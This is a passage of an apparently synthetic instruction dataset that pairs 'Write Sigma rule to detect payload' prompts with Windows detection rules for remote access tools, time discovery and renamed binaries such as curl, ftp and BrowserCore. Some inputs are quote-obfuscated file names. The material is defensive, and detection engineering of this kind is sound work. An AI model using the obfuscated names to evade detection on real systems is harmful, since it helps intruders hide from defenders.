windows\ndetection:\n    selection:\n        Image|contains:\n            - '\\JWrapper-Remote Access\\'\n            - '\\JWrapper-Remote Support\\'\n        Image|endswith: '\\SimpleService.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate usage of the tool\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\SimpleService", "output": "title: Remote Access Tool - Simple Help Execution\nid: 95e60a2b-4705-444b-b7da-ba0ea81a3ee2\nstatus: test\ndescription: |\n    An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.\n    These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.\n    Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\nreferences:\n    - https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2024-02-23\ntags:\n    - attack.command-and-control\n    - attack.t1219.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|contains:\n            - '\\JWrapper-Remote Access\\'\n            - '\\JWrapper-Remote Support\\'\n        Image|endswith: '\\SimpleService.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate usage of the tool\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\SimpleService.exe", "output": "title: Remote Access Tool - Simple Help Execution\nid: 95e60a2b-4705-444b-b7da-ba0ea81a3ee2\nstatus: test\ndescription: |\n    An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.\n    These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.\n    Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\nreferences:\n    - https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2024-02-23\ntags:\n    - attack.command-and-control\n    - attack.t1219.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|contains:\n            - '\\JWrapper-Remote Access\\'\n            - '\\JWrapper-Remote Support\\'\n        Image|endswith: '\\SimpleService.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate usage of the tool\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\net.exe \\net1.exe time \\w32tm.exe tz", "output": "title: Discovery of a System Time\nid: b243b280-65fe-48df-ba07-6ddea7646427\nstatus: test\ndescription: Identifies use of various commands to query a systems time. This technique may be used before executing a scheduled task or to discover the time zone of a target system.\nreferences:\n    - https://eqllib.readthedocs.io/en/latest/analytics/fcdb99c2-ac3c-4bde-b664-4b336329bed2.html\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1124/T1124.md\nauthor: E.M. Anhaus (originally from Atomic Blue Detections, Endgame), oscd.community\ndate: 2019-10-24\nmodified: 2022-06-28\ntags:\n    - attack.discovery\n    - attack.t1124\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_time:\n        Image|endswith:\n            - '\\net.exe'\n            - '\\net1.exe'\n        CommandLine|contains: 'time'\n    selection_w32tm:\n        Image|endswith: '\\w32tm.exe'\n        CommandLine|contains: 'tz'\n    condition: 1 of selection_*\nfalsepositives:\n    - Legitimate use of the system utilities to discover system time for legitimate reason\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\net.exe \\net1.exe time \"\\w32tm.exe\" tz", "output": "title: Discovery of a System Time\nid: b243b280-65fe-48df-ba07-6ddea7646427\nstatus: test\ndescription: Identifies use of various commands to query a systems time. This technique may be used before executing a scheduled task or to discover the time zone of a target system.\nreferences:\n    - https://eqllib.readthedocs.io/en/latest/analytics/fcdb99c2-ac3c-4bde-b664-4b336329bed2.html\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1124/T1124.md\nauthor: E.M. Anhaus (originally from Atomic Blue Detections, Endgame), oscd.community\ndate: 2019-10-24\nmodified: 2022-06-28\ntags:\n    - attack.discovery\n    - attack.t1124\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_time:\n        Image|endswith:\n            - '\\net.exe'\n            - '\\net1.exe'\n        CommandLine|contains: 'time'\n    selection_w32tm:\n        Image|endswith: '\\w32tm.exe'\n        CommandLine|contains: 'tz'\n    condition: 1 of selection_*\nfalsepositives:\n    - Legitimate use of the system utilities to discover system time for legitimate reason\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\net \\net1 time \\w32tm tz", "output": "title: Discovery of a System Time\nid: b243b280-65fe-48df-ba07-6ddea7646427\nstatus: test\ndescription: Identifies use of various commands to query a systems time. This technique may be used before executing a scheduled task or to discover the time zone of a target system.\nreferences:\n    - https://eqllib.readthedocs.io/en/latest/analytics/fcdb99c2-ac3c-4bde-b664-4b336329bed2.html\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1124/T1124.md\nauthor: E.M. Anhaus (originally from Atomic Blue Detections, Endgame), oscd.community\ndate: 2019-10-24\nmodified: 2022-06-28\ntags:\n    - attack.discovery\n    - attack.t1124\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_time:\n        Image|endswith:\n            - '\\net.exe'\n            - '\\net1.exe'\n        CommandLine|contains: 'time'\n    selection_w32tm:\n        Image|endswith: '\\w32tm.exe'\n        CommandLine|contains: 'tz'\n    condition: 1 of selection_*\nfalsepositives:\n    - Legitimate use of the system utilities to discover system time for legitimate reason\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\net.exe \\net1.exe tz \\w32tm.exe time", "output": "title: Discovery of a System Time\nid: b243b280-65fe-48df-ba07-6ddea7646427\nstatus: test\ndescription: Identifies use of various commands to query a systems time. This technique may be used before executing a scheduled task or to discover the time zone of a target system.\nreferences:\n    - https://eqllib.readthedocs.io/en/latest/analytics/fcdb99c2-ac3c-4bde-b664-4b336329bed2.html\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1124/T1124.md\nauthor: E.M. Anhaus (originally from Atomic Blue Detections, Endgame), oscd.community\ndate: 2019-10-24\nmodified: 2022-06-28\ntags:\n    - attack.discovery\n    - attack.t1124\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_time:\n        Image|endswith:\n            - '\\net.exe'\n            - '\\net1.exe'\n        CommandLine|contains: 'time'\n    selection_w32tm:\n        Image|endswith: '\\w32tm.exe'\n        CommandLine|contains: 'tz'\n    condition: 1 of selection_*\nfalsepositives:\n    - Legitimate use of the system utilities to discover system time for legitimate reason\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "Cmd.Exe CONHOST.EXE 7z.exe WinRAR.exe wevtutil.exe net.exe net1.exe netsh.exe InstallUtil.exe \\cmd.exe \\conhost.exe \\7z.exe \\WinRAR.exe \\wevtutil.exe \\net.exe \\net1.exe \\netsh.exe \\InstallUtil.exe", "output": "title: Potential Defense Evasion Via Binary Rename\nid: 36480ae1-a1cb-4eaa-a0d6-29801d7e9142\nrelated:\n    - id: 0ba1da6d-b6ce-4366-828c-18826c9de23e\n      type: similar\nstatus: test\ndescription: Detects the execution of a renamed binary often used by attackers or malware leveraging new Sysmon OriginalFileName datapoint.\nreferences:\n    - https://mgreen27.github.io/posts/2019/05/12/BinaryRename.html\n    - https://mgreen27.github.io/posts/2019/05/29/BinaryRename2.html\n    - https://github.com/redcanaryco/atomic-red-team/blob/0f229c0e42bfe7ca736a14023836d65baa941ed2/atomics/T1036.003/T1036.003.md#atomic-test-1---masquerading-as-windows-lsass-process\nauthor: Matthew Green @mgreen27, Ecco, James Pemberton @4A616D6573, oscd.community, Andreas Hunkeler (@Karneades)\ndate: 2019-06-15\nmodified: 2023-01-18\ntags:\n    - attack.defense-evasion\n    - attack.t1036.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        OriginalFileName:\n            - 'Cmd.Exe'\n            - 'CONHOST.EXE'\n            - '7z.exe'\n            - 'WinRAR.exe'\n            - 'wevtutil.exe'\n            - 'net.exe'\n            - 'net1.exe'\n            - 'netsh.exe'\n            - 'InstallUtil.exe'\n    filter:\n        Image|endswith:\n            - '\\cmd.exe'\n            - '\\conhost.exe'\n            - '\\7z.exe'\n            - '\\WinRAR.exe'\n            - '\\wevtutil.exe'\n            - '\\net.exe'\n            - '\\net1.exe'\n            - '\\netsh.exe'\n            - '\\InstallUtil.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Custom applications use renamed binaries adding slight change to binary name. Typically this is easy to spot and add to whitelist\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "Cmd.Exe \"CONHO\"ST.EXE 7z.exe WinRAR.exe wevtutil.exe net.exe net1.exe netsh.exe InstallUtil.exe \\cmd.exe \\conhost.exe \\7z.exe \\WinRAR.exe \\wevtutil.exe \\net.exe \\net1.exe \\netsh.exe \\InstallUtil.exe", "output": "title: Potential Defense Evasion Via Binary Rename\nid: 36480ae1-a1cb-4eaa-a0d6-29801d7e9142\nrelated:\n    - id: 0ba1da6d-b6ce-4366-828c-18826c9de23e\n      type: similar\nstatus: test\ndescription: Detects the execution of a renamed binary often used by attackers or malware leveraging new Sysmon OriginalFileName datapoint.\nreferences:\n    - https://mgreen27.github.io/posts/2019/05/12/BinaryRename.html\n    - https://mgreen27.github.io/posts/2019/05/29/BinaryRename2.html\n    - https://github.com/redcanaryco/atomic-red-team/blob/0f229c0e42bfe7ca736a14023836d65baa941ed2/atomics/T1036.003/T1036.003.md#atomic-test-1---masquerading-as-windows-lsass-process\nauthor: Matthew Green @mgreen27, Ecco, James Pemberton @4A616D6573, oscd.community, Andreas Hunkeler (@Karneades)\ndate: 2019-06-15\nmodified: 2023-01-18\ntags:\n    - attack.defense-evasion\n    - attack.t1036.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        OriginalFileName:\n            - 'Cmd.Exe'\n            - 'CONHOST.EXE'\n            - '7z.exe'\n            - 'WinRAR.exe'\n            - 'wevtutil.exe'\n            - 'net.exe'\n            - 'net1.exe'\n            - 'netsh.exe'\n            - 'InstallUtil.exe'\n    filter:\n        Image|endswith:\n            - '\\cmd.exe'\n            - '\\conhost.exe'\n            - '\\7z.exe'\n            - '\\WinRAR.exe'\n            - '\\wevtutil.exe'\n            - '\\net.exe'\n            - '\\net1.exe'\n            - '\\netsh.exe'\n            - '\\InstallUtil.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Custom applications use renamed binaries adding slight change to binary name. Typically this is easy to spot and add to whitelist\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "Cmd CONHOST 7z WinRAR wevtutil net net1 netsh InstallUtil \\cmd \\conhost \\7z \\WinRAR \\wevtutil \\net \\net1 \\netsh \\InstallUtil", "output": "title: Potential Defense Evasion Via Binary Rename\nid: 36480ae1-a1cb-4eaa-a0d6-29801d7e9142\nrelated:\n    - id: 0ba1da6d-b6ce-4366-828c-18826c9de23e\n      type: similar\nstatus: test\ndescription: Detects the execution of a renamed binary often used by attackers or malware leveraging new Sysmon OriginalFileName datapoint.\nreferences:\n    - https://mgreen27.github.io/posts/2019/05/12/BinaryRename.html\n    - https://mgreen27.github.io/posts/2019/05/29/BinaryRename2.html\n    - https://github.com/redcanaryco/atomic-red-team/blob/0f229c0e42bfe7ca736a14023836d65baa941ed2/atomics/T1036.003/T1036.003.md#atomic-test-1---masquerading-as-windows-lsass-process\nauthor: Matthew Green @mgreen27, Ecco, James Pemberton @4A616D6573, oscd.community, Andreas Hunkeler (@Karneades)\ndate: 2019-06-15\nmodified: 2023-01-18\ntags:\n    - attack.defense-evasion\n    - attack.t1036.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        OriginalFileName:\n            - 'Cmd.Exe'\n            - 'CONHOST.EXE'\n            - '7z.exe'\n            - 'WinRAR.exe'\n            - 'wevtutil.exe'\n            - 'net.exe'\n            - 'net1.exe'\n            - 'netsh.exe'\n            - 'InstallUtil.exe'\n    filter:\n        Image|endswith:\n            - '\\cmd.exe'\n            - '\\conhost.exe'\n            - '\\7z.exe'\n            - '\\WinRAR.exe'\n            - '\\wevtutil.exe'\n            - '\\net.exe'\n            - '\\net1.exe'\n            - '\\netsh.exe'\n            - '\\InstallUtil.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Custom applications use renamed binaries adding slight change to binary name. Typically this is easy to spot and add to whitelist\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "Cmd.Exe CONHOST.EXE 7z.exe WinRAR.exe wevtutil.exe net.exe net1.exe netsh.exe InstallUtil.exe \\cmd.exe \\conhost.exe \\7z.exe \\WinRAR.exe \\wevtutil.exe \\net.exe \\net1.exe \\netsh.exe \\InstallUtil.exe", "output": "title: Potential Defense Evasion Via Binary Rename\nid: 36480ae1-a1cb-4eaa-a0d6-29801d7e9142\nrelated:\n    - id: 0ba1da6d-b6ce-4366-828c-18826c9de23e\n      type: similar\nstatus: test\ndescription: Detects the execution of a renamed binary often used by attackers or malware leveraging new Sysmon OriginalFileName datapoint.\nreferences:\n    - https://mgreen27.github.io/posts/2019/05/12/BinaryRename.html\n    - https://mgreen27.github.io/posts/2019/05/29/BinaryRename2.html\n    - https://github.com/redcanaryco/atomic-red-team/blob/0f229c0e42bfe7ca736a14023836d65baa941ed2/atomics/T1036.003/T1036.003.md#atomic-test-1---masquerading-as-windows-lsass-process\nauthor: Matthew Green @mgreen27, Ecco, James Pemberton @4A616D6573, oscd.community, Andreas Hunkeler (@Karneades)\ndate: 2019-06-15\nmodified: 2023-01-18\ntags:\n    - attack.defense-evasion\n    - attack.t1036.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        OriginalFileName:\n            - 'Cmd.Exe'\n            - 'CONHOST.EXE'\n            - '7z.exe'\n            - 'WinRAR.exe'\n            - 'wevtutil.exe'\n            - 'net.exe'\n            - 'net1.exe'\n            - 'netsh.exe'\n            - 'InstallUtil.exe'\n    filter:\n        Image|endswith:\n            - '\\cmd.exe'\n            - '\\conhost.exe'\n            - '\\7z.exe'\n            - '\\WinRAR.exe'\n            - '\\wevtutil.exe'\n            - '\\net.exe'\n            - '\\net1.exe'\n            - '\\netsh.exe'\n            - '\\InstallUtil.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Custom applications use renamed binaries adding slight change to binary name. Typically this is easy to spot and add to whitelist\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "BOINC.exe \\BOINC.exe", "output": "title: Renamed BOINC Client Execution\nid: 30d07da2-83ab-45d8-ae75-ec7c0edcaffc\nstatus: test\ndescription: Detects the execution of a renamed BOINC binary.\nreferences:\n    - https://boinc.berkeley.edu/\n    - https://www.virustotal.com/gui/file/91e405e8a527023fb8696624e70498ae83660fe6757cef4871ce9bcc659264d3/details\n    - https://www.huntress.com/blog/fake-browser-updates-lead-to-boinc-volunteer-computing-software\nauthor: Matt Anderson (Huntress)\ndate: 2024-07-23\ntags:\n    - attack.defense-evasion\n    - attack.t1553\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        OriginalFileName: 'BOINC.exe'\n    filter_main_legit_name:\n        Image|endswith: '\\BOINC.exe'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "BOINC.exe \\BOIN\"C.exe\"", "output": "title: Renamed BOINC Client Execution\nid: 30d07da2-83ab-45d8-ae75-ec7c0edcaffc\nstatus: test\ndescription: Detects the execution of a renamed BOINC binary.\nreferences:\n    - https://boinc.berkeley.edu/\n    - https://www.virustotal.com/gui/file/91e405e8a527023fb8696624e70498ae83660fe6757cef4871ce9bcc659264d3/details\n    - https://www.huntress.com/blog/fake-browser-updates-lead-to-boinc-volunteer-computing-software\nauthor: Matt Anderson (Huntress)\ndate: 2024-07-23\ntags:\n    - attack.defense-evasion\n    - attack.t1553\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        OriginalFileName: 'BOINC.exe'\n    filter_main_legit_name:\n        Image|endswith: '\\BOINC.exe'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "BOINC \\BOINC", "output": "title: Renamed BOINC Client Execution\nid: 30d07da2-83ab-45d8-ae75-ec7c0edcaffc\nstatus: test\ndescription: Detects the execution of a renamed BOINC binary.\nreferences:\n    - https://boinc.berkeley.edu/\n    - https://www.virustotal.com/gui/file/91e405e8a527023fb8696624e70498ae83660fe6757cef4871ce9bcc659264d3/details\n    - https://www.huntress.com/blog/fake-browser-updates-lead-to-boinc-volunteer-computing-software\nauthor: Matt Anderson (Huntress)\ndate: 2024-07-23\ntags:\n    - attack.defense-evasion\n    - attack.t1553\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        OriginalFileName: 'BOINC.exe'\n    filter_main_legit_name:\n        Image|endswith: '\\BOINC.exe'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "BOINC.exe \\BOINC.exe", "output": "title: Renamed BOINC Client Execution\nid: 30d07da2-83ab-45d8-ae75-ec7c0edcaffc\nstatus: test\ndescription: Detects the execution of a renamed BOINC binary.\nreferences:\n    - https://boinc.berkeley.edu/\n    - https://www.virustotal.com/gui/file/91e405e8a527023fb8696624e70498ae83660fe6757cef4871ce9bcc659264d3/details\n    - https://www.huntress.com/blog/fake-browser-updates-lead-to-boinc-volunteer-computing-software\nauthor: Matt Anderson (Huntress)\ndate: 2024-07-23\ntags:\n    - attack.defense-evasion\n    - attack.t1553\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        OriginalFileName: 'BOINC.exe'\n    filter_main_legit_name:\n        Image|endswith: '\\BOINC.exe'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "BrowserCore.exe \\BrowserCore.exe", "output": "title: Renamed BrowserCore.EXE Execution\nid: 8a4519e8-e64a-40b6-ae85-ba8ad2177559\nstatus: test\ndescription: Detects process creation with a renamed BrowserCore.exe (used to extract Azure tokens)\nreferences:\n    - https://twitter.com/mariuszbit/status/1531631015139102720\nauthor: Max Altgelt (Nextron Systems)\ndate: 2022-06-02\nmodified: 2023-02-03\ntags:\n    - attack.credential-access\n    - attack.defense-evasion\n    - attack.t1528\n    - attack.t1036.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        OriginalFileName: BrowserCore.exe\n    filter_realbrowsercore:\n        Image|endswith: '\\BrowserCore.exe'\n    condition: selection and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "BrowserCore.exe \\\"B\"\"r\"\"o\"\"w\"\"s\"\"e\"\"r\"\"C\"\"o\"\"r\"\"e\"\".\"\"e\"\"x\"\"e\"", "output": "title: Renamed BrowserCore.EXE Execution\nid: 8a4519e8-e64a-40b6-ae85-ba8ad2177559\nstatus: test\ndescription: Detects process creation with a renamed BrowserCore.exe (used to extract Azure tokens)\nreferences:\n    - https://twitter.com/mariuszbit/status/1531631015139102720\nauthor: Max Altgelt (Nextron Systems)\ndate: 2022-06-02\nmodified: 2023-02-03\ntags:\n    - attack.credential-access\n    - attack.defense-evasion\n    - attack.t1528\n    - attack.t1036.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        OriginalFileName: BrowserCore.exe\n    filter_realbrowsercore:\n        Image|endswith: '\\BrowserCore.exe'\n    condition: selection and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "BrowserCore \\BrowserCore", "output": "title: Renamed BrowserCore.EXE Execution\nid: 8a4519e8-e64a-40b6-ae85-ba8ad2177559\nstatus: test\ndescription: Detects process creation with a renamed BrowserCore.exe (used to extract Azure tokens)\nreferences:\n    - https://twitter.com/mariuszbit/status/1531631015139102720\nauthor: Max Altgelt (Nextron Systems)\ndate: 2022-06-02\nmodified: 2023-02-03\ntags:\n    - attack.credential-access\n    - attack.defense-evasion\n    - attack.t1528\n    - attack.t1036.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        OriginalFileName: BrowserCore.exe\n    filter_realbrowsercore:\n        Image|endswith: '\\BrowserCore.exe'\n    condition: selection and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "BrowserCore.exe \\BrowserCore.exe", "output": "title: Renamed BrowserCore.EXE Execution\nid: 8a4519e8-e64a-40b6-ae85-ba8ad2177559\nstatus: test\ndescription: Detects process creation with a renamed BrowserCore.exe (used to extract Azure tokens)\nreferences:\n    - https://twitter.com/mariuszbit/status/1531631015139102720\nauthor: Max Altgelt (Nextron Systems)\ndate: 2022-06-02\nmodified: 2023-02-03\ntags:\n    - attack.credential-access\n    - attack.defense-evasion\n    - attack.t1528\n    - attack.t1036.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        OriginalFileName: BrowserCore.exe\n    filter_realbrowsercore:\n        Image|endswith: '\\BrowserCore.exe'\n    condition: selection and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "curl.exe", "output": "title: Renamed CURL.EXE Execution\nid: 7530cd3d-7671-43e3-b209-976966f6ea48\nstatus: test\ndescription: Detects the execution of a renamed \"CURL.exe\" binary based on the PE metadata fields\nreferences:\n    - https://twitter.com/Kostastsale/status/1700965142828290260\nauthor: X__Junior (Nextron Systems)\ndate: 2023-09-11\nmodified: 2023-10-12\ntags:\n    - attack.execution\n    - attack.t1059\n    - attack.defense-evasion\n    - attack.t1202\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - OriginalFileName: 'curl.exe'\n        - Description: 'The curl executable'\n    filter_main_img:\n        Image|contains: '\\curl'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "curl.exe", "output": "title: Renamed CURL.EXE Execution\nid: 7530cd3d-7671-43e3-b209-976966f6ea48\nstatus: test\ndescription: Detects the execution of a renamed \"CURL.exe\" binary based on the PE metadata fields\nreferences:\n    - https://twitter.com/Kostastsale/status/1700965142828290260\nauthor: X__Junior (Nextron Systems)\ndate: 2023-09-11\nmodified: 2023-10-12\ntags:\n    - attack.execution\n    - attack.t1059\n    - attack.defense-evasion\n    - attack.t1202\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - OriginalFileName: 'curl.exe'\n        - Description: 'The curl executable'\n    filter_main_img:\n        Image|contains: '\\curl'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "curl", "output": "title: Renamed CURL.EXE Execution\nid: 7530cd3d-7671-43e3-b209-976966f6ea48\nstatus: test\ndescription: Detects the execution of a renamed \"CURL.exe\" binary based on the PE metadata fields\nreferences:\n    - https://twitter.com/Kostastsale/status/1700965142828290260\nauthor: X__Junior (Nextron Systems)\ndate: 2023-09-11\nmodified: 2023-10-12\ntags:\n    - attack.execution\n    - attack.t1059\n    - attack.defense-evasion\n    - attack.t1202\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - OriginalFileName: 'curl.exe'\n        - Description: 'The curl executable'\n    filter_main_img:\n        Image|contains: '\\curl'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "curl.exe", "output": "title: Renamed CURL.EXE Execution\nid: 7530cd3d-7671-43e3-b209-976966f6ea48\nstatus: test\ndescription: Detects the execution of a renamed \"CURL.exe\" binary based on the PE metadata fields\nreferences:\n    - https://twitter.com/Kostastsale/status/1700965142828290260\nauthor: X__Junior (Nextron Systems)\ndate: 2023-09-11\nmodified: 2023-10-12\ntags:\n    - attack.execution\n    - attack.t1059\n    - attack.defense-evasion\n    - attack.t1202\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - OriginalFileName: 'curl.exe'\n        - Description: 'The curl executable'\n    filter_main_img:\n        Image|contains: '\\curl'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "ftp.exe \\ftp.exe", "output": "title: Renamed FTP.EXE Execution\nid: 277a4393-446c-449a-b0ed-7fdc7795244c\nstatus: test\ndescription: Detects the execution of a renamed \"ftp.exe\" binary based on the PE metadata fields\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Ftp/\nauthor: Victor Sergeev, oscd.community\ndate: 2020-10-09\nmodified: 2023-02-03\ntags:\n    - attack.execution\n    - attack.t1059\n    - attack.defense-evasion\n    - attack.t1202\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_original:\n        OriginalFileName: 'ftp.exe'\n    filter_img:\n        Image|endswith: '\\ftp.exe'\n    condition: selection_original and not filter_img\nfields:\n    - CommandLine\n    - ParentImage\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "ftp.exe \\\"f\"\"t\"\"p\"\".\"\"e\"\"x\"\"e\"", "output": "title: Renamed FTP.EXE Execution\nid: 277a4393-446c-449a-b0ed-7fdc7795244c\nstatus: test\ndescription: Detects the execution of a renamed \"ftp.exe\" binary based on the PE metadata fields\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Ftp/\nauthor: Victor Sergeev, oscd.community\ndate: 2020-10-09\nmodified: 2023-02-03\ntags:\n    - attack.execution\n    - attack.t1059\n    - attack.defense-evasion\n    - attack.t1202\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_original:\n        OriginalFileName: 'ftp.exe'\n    filter_img:\n        Image|endswith: '\\ftp.exe'\n    condition: selection_original and not filter_img\nfields:\n    - CommandLine\n    - ParentImage\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "ftp \\ftp", "output": "title: Renamed FTP.EXE Execution\nid: 277a4393-446c-449a-b0ed-7fdc7795244c\nstatus: test\ndescription: Detects the execution of a renamed \"ftp.exe\" binary based on the PE metadata fields\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Ftp/\nauthor: Victor Sergeev, oscd.community\ndate: 2020-10-09\nmodified: 2023-02-03\ntags:\n    - attack.execution\n    - attack.t1059\n    - attack.defense-evasion\n    - attack.t1202\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_original:\n        OriginalFileName: 'ftp.exe'\n    filter_img:\n        Image|endswith: '\\ftp.exe'\n    condition: selection_original and not filter_img\nfields:\n    - CommandLine\n    - ParentImage\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "ftp.exe \\ftp.exe", "output": "title: Renamed FTP.EXE Execution\nid: 277a4393-446c-449a-b0ed-7fdc7795244c\nstatus: test\ndescription: Detects the execution of a renamed \"ftp.exe\" binary based on the PE metadata fields\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Ftp/\nauthor: Victor Sergeev, oscd.community\ndate: 2020-10-09\nmodified: 2023-02-03\ntags:\n    - attack.execution\n    - attack.t1059\n    - attack.defense-evasion\n    - attack.t1202\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_original:\n        OriginalFileName: 'ftp.exe'\n    filter_img:\n        Image|endswith: '\\ftp.exe'\n    condition: selection_original and not filter_img\nfields:\n    - CommandLine\n    - ParentImage\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "gpg.exe \\gpg.exe \\gpg2.exe", "output": "title: Renamed Gpg.EXE Execution\nid: ec0722a3-eb5c-4a56-8ab2-bf6f20708592\nstatus: test\ndescription: Detects the execution of a renamed \"gpg.exe\". Often used by ransomware and loaders to decrypt/encrypt data.\nreferences:\n    - https://securelist.com/locked-out/68960/\nauthor: Nasreddine Bencherchali (Nextron Systems), frack113\ndate: 2023-08-09\ntags:\n    - attack.impact\n    - attack.t1486\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        OriginalFileName: 'gpg.exe'\n    filter_main_img:\n        Image|endswith:\n            - '\\gpg.exe'\n            - '\\gpg2.exe'\n    condition: selection and not 1 of filter_main_*\nlevel: high"}
